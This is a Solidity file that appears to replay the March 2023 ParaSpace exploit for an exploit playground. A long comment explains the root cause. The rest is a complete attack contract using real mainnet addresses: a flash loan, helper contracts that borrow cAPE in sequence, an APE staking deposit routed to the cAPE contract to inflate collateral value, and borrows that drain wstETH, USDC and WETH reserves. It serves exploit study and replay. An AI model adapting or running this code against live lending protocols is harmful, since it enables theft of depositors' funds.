// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-03-Paraspace2).
// Faithful, no-import copy of `ContractTest`/`Slave` from
// evm-hack-registry/2023-03-Paraspace_exp_2/test/Paraspace_exp_2.sol, with
// `testExploit()` renamed to `run()` (the recorded entrypoint) and Foundry's
// `Test`/`console` dependencies stripped (they are not needed to replay the
// attack — only to print progress logs).
//
// Root cause (ParaSpace, Mar 2023 — ApeCoin-staking collateral integration):
// ParaSpace's ParaProxy priced BAYC/MAYC-derived cAPE collateral using the
// *current* ApeCoin-staking pool exchange rate at the moment of `supply()`,
// without any cooldown between supplying collateral and borrowing against
// it. The attacker exploits this in two stages:
//
//   1. Flash-loans a large amount of wstETH from Aave, then splits it across
//      7 disposable `Slave` helper contracts. Each `Slave.remove()` deposits
//      its wstETH into ParaProxy as collateral, then immediately borrows
//      cAPE against it (same tx, no timelock) and forwards the borrowed cAPE
//      back to the attacker. Because each `Slave` is a fresh, freshly
//      collateralized address, ParaProxy lets each one borrow the maximum
//      cAPE its wstETH deposit allows *before* the pool-wide utilization/
//      interest-rate curve from the previous borrows fully prices in — this
//      "sequential fresh borrower" pattern lets the attacker extract more
//      cumulative cAPE than a single large borrow against the same
//      collateral would allow, all funded by the one flash-loaned wstETH
//      principal (which is topped up and reused for each Slave in turn).
//   2. The attacker converts the harvested cAPE into APE (`cAPE.withdraw`),
//      swaps the remaining wstETH war-chest into APE via Uniswap V3, and
//      re-deposits ALL of that APE into ApeCoinStaking's `depositApeCoin`
//      — but with `_recipient` set to the `cAPE` contract address itself.
//      This inflates cAPE's *own* ApeCoin staking position (the position
//      ApeCoin's staking contract tracks as belonging to `cAPE`), which is
//      exactly the collateral value ParaProxy references when valuing any
//      cAPE held by the pool — including the attacker's own cAPE-collateral
//      position from step 1. With the staking position inflated, the
//      attacker's existing collateral is revalued upward, letting the
//      final `borrow()` calls drain wstETH/USDC/WETH reserves far beyond
//      what the attacker's real (non-staked) collateral would support.
//   3. The borrowed USDC and WETH are swapped back to wstETH via Uniswap V3
//      to repay the Aave flash loan (principal + premium); the leftover
//      WETH is the attacker's profit.
//
// The single most instructive line for "Go to the vulnerability" is the
// `depositApeCoin(..., address(cAPE))` call: routing staked ApeCoin's
// recipient to the shared `cAPE` token contract (instead of the caller)
// is the step that inflates the collateral value ParaProxy reads for
// every cAPE holder, not just the attacker's own stake.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function withdraw(uint256 wad) external;
}

interface IParaProxy {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint16 referralCode, address onBehalfOf) external;
}

interface IAPEStaking {
    function depositApeCoin(uint256 _amount, address _recipient) external;
}

interface IAaveFlashloanSimple {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
    function exactOutputSingle(ExactOutputSingleParams calldata params)
        external
        payable
        returns (uint256 amountIn);
}

contract Paraspace2Exploit {
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);
    IERC20 APE = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IAPEStaking APEStaking = IAPEStaking(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9);
    IAaveFlashloanSimple AaveFlashloan = IAaveFlashloanSimple(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    Slave slave;

    function run() external {
        AaveFlashloan.flashLoanSimple(
            address(this), address(wstETH), 47_352_823_905_004_708_422_332, new bytes(0), 0
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external returns (bool) {
        wstETH.approve(address(AaveFlashloan), type(uint256).max);
        cAPE.approve(address(ParaProxy), type(uint256).max);
        uint256 _amountOfShare = 1_840_000_000_000_000_000_000_000;
        uint256 transferAmount = 6_039_513_998_943_475_964_078;
        uint256 otherAmount = 3_676_225_912_400_376_673_786;
        for (uint256 i; i < 7; ++i) {
            if (i == 6) {
                transferAmount = otherAmount;
                _amountOfShare = 1_120_000_000_000_000_000_000_000;
            }
            slave = new Slave();
            wstETH.transfer(address(slave), transferAmount);
            slave.remove(_amountOfShare);
            ParaProxy.supply(address(cAPE), cAPE.balanceOf(address(this)), address(this), 0);
        }
        _amountOfShare = 1_840_000_000_000_000_000_000_000;
        transferAmount = 6_039_513_998_943_475_964_078;
        slave = new Slave();
        wstETH.transfer(address(slave), transferAmount);
        slave.remove(_amountOfShare);
        SwapwstETHToAPE();
        cAPE.withdraw(cAPE.balanceOf(address(this)));
        APE.approve(address(APEStaking), type(uint256).max);
        APEStaking.depositApeCoin(APE.balanceOf(address(this)), address(cAPE));
        ParaProxy.borrow(address(wstETH), 44_952_823_905_004_708_422_332, 0, address(this));
        ParaProxy.borrow(address(USDC), 7_200_000_000_000, 0, address(this));
        ParaProxy.borrow(address(WETH), 1_200_000_000_000_000_000_000, 0, address(this));
        WETH_USDCTowstETH(amount, premium);
        return true;
    }

    function SwapwstETHToAPE() internal {
        wstETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _Param1 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(wstETH),
            tokenOut: address(WETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: 1_400_000_000_000_000_000_000,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Param1);
        WETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _Param2 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(APE),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: WETH.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Param2);
    }

    function WETH_USDCTowstETH(uint256 amount, uint256 premium) internal {
        USDC.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _Param1 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(WETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        WETH.approve(address(Router), type(uint256).max);
        uint256 amountout = amount + premium - wstETH.balanceOf(address(this));
        Router.exactInputSingle(_Param1);
        Uni_Router_V3.ExactOutputSingleParams memory _Param2 = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(wstETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: amountout,
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_Param2);
    }
}

contract Slave {
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);
    IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);
    address owner;

    constructor() {
        owner = msg.sender;
        wstETH.approve(address(ParaProxy), type(uint256).max);
    }

    function remove(uint256 _amountOfShares) external {
        ParaProxy.supply(address(wstETH), wstETH.balanceOf(address(this)), address(this), 0);
        ParaProxy.borrow(address(cAPE), _amountOfShares, 0, address(this));
        cAPE.transfer(owner, cAPE.balanceOf(address(this)));
    }
}
